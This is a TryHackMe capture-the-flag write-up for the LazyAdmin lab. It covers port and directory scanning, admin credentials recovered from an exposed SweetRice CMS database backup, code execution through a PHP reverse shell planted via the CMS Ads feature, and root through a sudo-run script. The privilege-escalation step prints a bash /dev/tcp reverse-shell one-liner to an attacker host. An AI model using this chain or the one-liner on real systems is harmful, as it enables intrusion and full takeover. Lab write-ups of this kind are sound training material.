# LazyAdmin: Write-up
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Web  

---

## Reconnaissance

### Connectivity Check
```bash
└─$ ping -c 3 <TARGET_IP>
```

### Port Scan
```bash
└─$ nmap -n -Pn -T4 -p- -sC -sV <TARGET_IP>
```

**Observed services:**
- **22/tcp**: OpenSSH 7.2p2 (Ubuntu)
- **80/tcp**: Apache httpd 2.4.18 (Ubuntu)

---

## Web Enumeration

### Directory Discovery
Initial fuzzing revealed a `/content/` subdirectory. Further enumeration of this path showed the following structure:

```bash
└─$ gobuster dir -u http://<TARGET_IP>/content/ -w /usr/share/wordlists/dirb/common.txt
```

**Notable Paths:**
- `/content/as/`: Administrative login portal.
- `/content/inc/`: Included files and configuration.
- `/content/attachment/`: User uploads.

### CMS Identification
Browsing `/content/` confirmed the target is running **SweetRice CMS 1.5.1**. This is a critical finding as it allows for targeted vulnerability research.

---

## Finding 1: Information Disclosure (Backup Leak)

Manual exploration of the `/content/inc/` directory revealed an exposed backup path:
`http://<TARGET_IP>/content/inc/mysql_backup/`

A backup file named `mysql_bakup_[TIMESTAMP].sql` was retrieved. Analysis of the SQL dump provided the administrative credentials:

- **Username:** `manager`
- **Password Hash (MD5):** `[REDACTED_HASH]`

### Credential Recovery
The MD5 hash was cracked using a standard wordlist:
- **Recovered Password:** `[REDACTED_PASS]`

---

## Exploitation: RCE via Arbitrary File Write

### Rationale
SweetRice 1.5.1 features an **Ads** management tool in the dashboard. This feature allows an administrator to define "ad code" which the CMS then writes directly into a `.php` file within a web-accessible directory (`/content/inc/ads/`).

### Execution Chain
1. **Access:** Logged into the admin portal at `/content/as/`.
2. **Injection:** Navigated to the Ads section and created a new "ad" containing a PHP reverse shell payload.
3. **Trigger:** Accessed the newly created file at:
   `http://<TARGET_IP>/content/inc/ads/[SHELL_NAME].php`
4. **Callback:** Captured a reverse shell on a local listener.

**Result:** Obtained interactive access as the `www-data` user. **User Flag** retrieved from the home directory.

---

## Privilege Escalation

### Sudo Misconfiguration (NOPASSWD)
Enumerating the user's permissions revealed a high-risk `sudo` entry:

```bash
└─$ sudo -l
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

### Execution Chain (Root)
The Perl script `backup.pl` was found to execute a shell script located at `/etc/copy.sh`. 

1. **Analysis:** The script `/etc/copy.sh` was world-writable.
2. **Manipulation:** Modified `/etc/copy.sh` to include a reverse shell one-liner:
   `echo "bash -i >& /dev/tcp/<ATTACKER_IP>/<PORT> 0>&1" > /etc/copy.sh`
3. **Trigger:** Executed the Perl script with `sudo`:
   `sudo /usr/bin/perl /home/itguy/backup.pl`

**Result:** Received a callback as **root**. **Root Flag** retrieved from `/root/root.txt`.

---

